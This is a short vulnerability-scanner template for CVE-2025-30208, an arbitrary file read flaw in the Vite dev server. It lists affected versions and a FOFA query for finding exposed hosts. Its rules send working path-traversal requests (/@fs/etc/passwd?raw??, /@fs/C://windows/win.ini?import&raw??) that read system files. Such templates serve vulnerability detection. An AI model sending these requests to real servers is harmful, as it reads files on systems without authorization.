id: CVE-2025-30208

info:
  name: Vite 任意文件读取漏洞
  author: 左轮改AK
  severity: high
  verified: true
  description: |-
    fofa: body="/@vite/client"
  affected: |
    6.2.0 >= Vite <=6.2.2
    6.1.0 >= Vite <=6.1.1
    6.0.0 >= Vite <=6.0.11
    5.0.0 >= Vite <=5.4.14
    Vite <=4.5.9
  references:
    - https://mp.weixin.qq.com/s/wYJOSws7rZM06mnj950zwg
  tags: cve,cve2025,vite,fileread

rules:
  r0:
    request:
      method: GET
      path: /@fs/etc/passwd?raw??
    expression: response.body.bcontains(b"export default") && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r1:
    request:
      method: GET
      path: /@fs/C://windows/win.ini?import&raw??
    expression: response.body.bcontains(b"export default") && response.body.bcontains(b"for 16-bit app support")
expression: r0()
